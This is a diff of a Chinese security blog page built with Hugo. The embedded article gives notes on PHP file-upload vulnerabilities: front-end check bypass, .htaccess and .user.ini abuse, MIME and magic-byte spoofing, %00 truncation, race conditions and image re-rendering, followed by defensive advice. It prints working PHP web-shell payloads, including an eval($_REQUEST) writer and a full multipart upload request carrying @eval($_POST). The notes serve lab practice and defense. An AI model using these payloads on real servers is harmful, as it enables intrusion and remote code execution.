@@ -61,8 +61,8 @@
   "keywords": [
     
   ],
-  "articleBody": "概览 本文为文件上传漏洞的复现与检测笔记，包含前后端验证类型、常见绕过技巧、以及一些攻击构造示例，便于实战练习（如 Docker labs）。 适用于 PHP 原生上传场景（但很多点可迁移到其它语言/框架）。 upload.jpg\r知识点摘要 1、前端 JS 校验 如何判断是前端校验？ 抓包时：如果在浏览器提示“文件类型不正确”之前，并未出现上传请求（即没有抓到 multipart/form-data 请求），那很可能是前端校验（JS 在提交前阻止了上传）。 实战：绕过前端校验可以通过构造请求（使用 curl / burp / python requests）直接发送 multipart 请求。 2、.htaccess 或 .user.ini 利用 .htaccess 示例： AddType application/x-httpd-php .png 将 .png 识别为 PHP，导致服务器把上传的图片作为 PHP 执行。 .user.ini 示例： auto_prepend_file = getshell.png 通过设置 PHP 配置项使得某些文件被当作入口载入。 3、MIME 类型 上传请求头中 Content-Type: image/png 并不足以保证文件是真正的图片，MIME 可伪造。 服务端不要只依赖 Content-Type 判断文件类型。 4、文件头判断（Magic bytes） 常见文件头示例： GIF：GIF89a 或 GIF87a PNG：前几字节 \\x89PNG\\r\\n\\x1a\\n 仅靠文件头判断也可能被绕过（比如在文件前或后追加 payload，或修改文件头后再恢复等技巧）。 5、黑名单 — 过滤不严（后缀） 简单字符串替换或黑名单可能被绕过，比如 pphphp、在后缀中嵌入无效字符等。 黑名单通常存在无递归替换或正则错误，容易被绕过。 6、大小写问题 文件名或后缀大小写敏感/不敏感导致判断失误（Windows vs Linux 的差异）。 例如 Shell.PHP、shell.Php 等都可能绕过只按小写判断的过滤。 7、低版本 GET 的 %00 截断 在一些早期 PHP/服务器配置中，%00（NULL）截断攻击： GET /var/www/html/upload/x.php%00 GET 请求可能被自动解码一次，从而触发截断。 8、低版本 POST 的 %00 截断 POST 请求不会自动解码，需要二次解码，攻击者可以尝试 ../upload/x.php%00 再二次解码绕过。 9、黑名单绕过举例（fuzz） 使用 fuzz 工具爆破可能会发现： php3、phtml、phps 等可执行扩展 通过 HTML 标签嵌入 PHP 代码（在某些解析器或古老配置下）： 10、逻辑缺陷 — 条件竞争（竞态） 场景：先保存文件，再进行过滤删除；攻击者并发上传可能在删除前触发包含/执行。 示例思路： 服务端保存 xiao.php 并写入恶意代码： \u003c?php fputs(fopen('xiao.php','w'),'\u003c?php eval($_REQUEST[1]);?\u003e');?\u003e 攻击方高速并发上传 / 请求，利用竞态条件执行后门。 11、二次渲染（图片处理导致保留区） 网站通常会对图片做二次渲染（缩放、压缩、转码），这可能删除植入的恶意代码。 绕过思路： 上传一张“正常”的图片，取得渲染后输出文件并比对差异（定位哪些字节被保留）。 在保留区插入后门代码（比如把后门插入到不会被渲染改变的部分）。 通过文件包含或其它路径执行该后门。 需要工具：010 Editor、hex 编辑器、图片差异比对工具。 12、函数缺陷 某些文件系统操作/路径拼接可能被利用，例如： move_uploaded_file($tmp, \"1.php/.\"); 如果保存的文件名可控，可能造成文件被当作可执行文件或放置在可包含目录下。 13、代码审计 — 表单数组绕过 利用表单字段数组或不常见的 Content-Disposition 字段名来绕过服务器端解析： -----------------------------174283082921961 Content-Disposition: form-data; name=\"save_name[0]\" http://2.php/ -----------------------------174283082921961 Content-Disposition: form-data; name=\"save_name[2]\" gif 这种方式经常用来混淆后端解析器，或者在数组索引处理中绕过校验。 附录、无法连接时 — 上传请求包构造示例 下面是一个构造的上传 POST 请求（multipart/form-data）示例，便于在 Burp/Netcat/curl 中复现：\nPOST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xx.xx.xx.xx:xxxx User-Agent: Mozilla/5.0 ... Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Content-Length: 265 ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.\u003c\u003ephp\" Content-Type: text/plain \u003c?php echo 'hello!!!';@eval($_POST['aw'])?\u003e ----------------------------921378126371623762173617-- 注意：上面示例用于实验测试用途，请仅在授权环境中复现。\n使用建议 / 防护要点（开发者方向） 不要只信任前端校验，需要服务端做同样或更严格的校验。 白名单优于黑名单：尽量只允许确切的、已验证的扩展名和 MIME 类型（并结合文件内容检测）。 检查文件内容（magic bytes）并结合库检测图片有效性（GD、ImageMagick 的安全调用）。 保存路径与可执行目录分离：将上传文件存放在不可执行目录，或配置 web server 不执行上传目录内脚本。 对文件名做严格处理：移除特殊字符、规范化路径、禁止 ../ 等父目录引用。 限制可上传大小 / 并发，防止 DoS / 竞态利用。 二次渲染安全：对图片处理组件加固，避免把可控数据保留在最终文件中。 日志与告警：记录异常上传行为（可疑扩展、批量上传等），及时触发审计。 ",
-  "wordCount" : "227",
+  "articleBody": "概览 本文为文件上传漏洞的复现与检测笔记，包含前后端验证类型、常见绕过技巧、以及一些攻击构造示例，便于实战练习（如 Docker labs）。 适用于 PHP 原生上传场景（但很多点可迁移到其它语言/框架）。 知识点摘要 1、前端 JS 校验 如何判断是前端校验？ 抓包时：如果在浏览器提示“文件类型不正确”之前，并未出现上传请求（即没有抓到 multipart/form-data 请求），那很可能是前端校验（JS 在提交前阻止了上传）。 实战：绕过前端校验可以通过构造请求（使用 curl / burp / python requests）直接发送 multipart 请求。 2、.htaccess 或 .user.ini 利用 .htaccess 示例： AddType application/x-httpd-php .png 将 .png 识别为 PHP，导致服务器把上传的图片作为 PHP 执行。 .user.ini 示例： auto_prepend_file = getshell.png 通过设置 PHP 配置项使得某些文件被当作入口载入。 3、MIME 类型 上传请求头中 Content-Type: image/png 并不足以保证文件是真正的图片，MIME 可伪造。 服务端不要只依赖 Content-Type 判断文件类型。 4、文件头判断（Magic bytes） 常见文件头示例： GIF：GIF89a 或 GIF87a PNG：前几字节 \\x89PNG\\r\\n\\x1a\\n 仅靠文件头判断也可能被绕过（比如在文件前或后追加 payload，或修改文件头后再恢复等技巧）。 5、黑名单 — 过滤不严（后缀） 简单字符串替换或黑名单可能被绕过，比如 pphphp、在后缀中嵌入无效字符等。 黑名单通常存在无递归替换或正则错误，容易被绕过。 6、大小写问题 文件名或后缀大小写敏感/不敏感导致判断失误（Windows vs Linux 的差异）。 例如 Shell.PHP、shell.Php 等都可能绕过只按小写判断的过滤。 7、低版本 GET 的 %00 截断 在一些早期 PHP/服务器配置中，%00（NULL）截断攻击： GET /var/www/html/upload/x.php%00 GET 请求可能被自动解码一次，从而触发截断。 8、低版本 POST 的 %00 截断 POST 请求不会自动解码，需要二次解码，攻击者可以尝试 ../upload/x.php%00 再二次解码绕过。 9、黑名单绕过举例（fuzz） 使用 fuzz 工具爆破可能会发现： php3、phtml、phps 等可执行扩展 通过 HTML 标签嵌入 PHP 代码（在某些解析器或古老配置下）： 10、逻辑缺陷 — 条件竞争（竞态） 场景：先保存文件，再进行过滤删除；攻击者并发上传可能在删除前触发包含/执行。 示例思路： 服务端保存 xiao.php 并写入恶意代码： \u003c?php fputs(fopen('xiao.php','w'),'\u003c?php eval($_REQUEST[1]);?\u003e');?\u003e 攻击方高速并发上传 / 请求，利用竞态条件执行后门。 11、二次渲染（图片处理导致保留区） 网站通常会对图片做二次渲染（缩放、压缩、转码），这可能删除植入的恶意代码。 绕过思路： 上传一张“正常”的图片，取得渲染后输出文件并比对差异（定位哪些字节被保留）。 在保留区插入后门代码（比如把后门插入到不会被渲染改变的部分）。 通过文件包含或其它路径执行该后门。 需要工具：010 Editor、hex 编辑器、图片差异比对工具。 12、函数缺陷 某些文件系统操作/路径拼接可能被利用，例如： move_uploaded_file($tmp, \"1.php/.\"); 如果保存的文件名可控，可能造成文件被当作可执行文件或放置在可包含目录下。 13、代码审计 — 表单数组绕过 利用表单字段数组或不常见的 Content-Disposition 字段名来绕过服务器端解析： -----------------------------174283082921961 Content-Disposition: form-data; name=\"save_name[0]\" http://2.php/ -----------------------------174283082921961 Content-Disposition: form-data; name=\"save_name[2]\" gif 这种方式经常用来混淆后端解析器，或者在数组索引处理中绕过校验。 附录、无法连接时 — 上传请求包构造示例 下面是一个构造的上传 POST 请求（multipart/form-data）示例，便于在 Burp/Netcat/curl 中复现：\nPOST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xx.xx.xx.xx:xxxx User-Agent: Mozilla/5.0 ... Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Content-Length: 265 ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.\u003c\u003ephp\" Content-Type: text/plain \u003c?php echo 'hello!!!';@eval($_POST['aw'])?\u003e ----------------------------921378126371623762173617-- 注意：上面示例用于实验测试用途，请仅在授权环境中复现。\n使用建议 / 防护要点（开发者方向） 不要只信任前端校验，需要服务端做同样或更严格的校验。 白名单优于黑名单：尽量只允许确切的、已验证的扩展名和 MIME 类型（并结合文件内容检测）。 检查文件内容（magic bytes）并结合库检测图片有效性（GD、ImageMagick 的安全调用）。 保存路径与可执行目录分离：将上传文件存放在不可执行目录，或配置 web server 不执行上传目录内脚本。 对文件名做严格处理：移除特殊字符、规范化路径、禁止 ../ 等父目录引用。 限制可上传大小 / 并发，防止 DoS / 竞态利用。 二次渲染安全：对图片处理组件加固，避免把可控数据保留在最终文件中。 日志与告警：记录异常上传行为（可疑扩展、批量上传等），及时触发审计。 ",
+  "wordCount" : "226",
   "inLanguage": "en",
   "datePublished": "2024-04-28T10:56:54+08:00",
   "dateModified": "2024-04-28T10:56:54+08:00",
@@ -204,7 +204,7 @@
 
   <p>
   <small>
-    April 28, 2024&nbsp;· 227 words&nbsp;· 2 min</small>
+    April 28, 2024&nbsp;· 226 words&nbsp;· 2 min</small>
 
   
 <p>
@@ -243,11 +243,8 @@
 </ul>
 <hr>
 <!--more-->
-<figure>
-<img src="http://118.178.86.67/image/upload.jpg" class="wikilink" alt="upload.jpg" />
-<figcaption aria-hidden="true">upload.jpg</figcaption>
-</figure>
-<img src="http://118.178.86.67/image/upload_tree.jpg" class="wikilink" alt="upload_tree.jpg" />
+<img src="/static/upload.jpg">
+<img src="/static/upload_tree.jpg">
 <hr>
 <h2 id="知识点摘要">知识点摘要</h2>
 <h3 id="1前端-js-校验">1、前端 JS 校验</h3>
@@ -437,7 +434,7 @@
 </article>
 
         </div><footer class="footer">
-  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
+  <p>&copy; 2026 <a href="http://www.hzhsec.top/">Hzhsec home</a>
     Powered by
     <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
     <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
